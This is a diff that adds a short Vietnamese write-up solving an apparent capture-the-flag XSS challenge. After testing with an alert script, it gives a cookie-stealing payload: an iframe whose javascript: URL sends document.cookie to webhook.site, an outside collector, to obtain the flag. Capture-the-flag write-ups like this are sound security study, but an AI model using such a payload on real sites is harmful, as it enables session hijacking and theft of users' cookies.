@@ -1031,4 +1031,10 @@ _bruteme.xlsx.extracted/xl/sharedStrings.xml:<sst xmlns="http://schemas.openxmlf
  
 ### Solution
 
-* 
+* Bài này thử với `<script>alert(1)</script>` để xác định xss. OK thành công.
+* Vậy thử lấy cookie xem. Payload mình dùng như sau: 
+* `<iframe src="javascript:window.location='//webhook.site?c='.concat(document.cookie)">`
+* Đợi 1 tí là có cờ.
+
+<img src=temp/41.png>
+
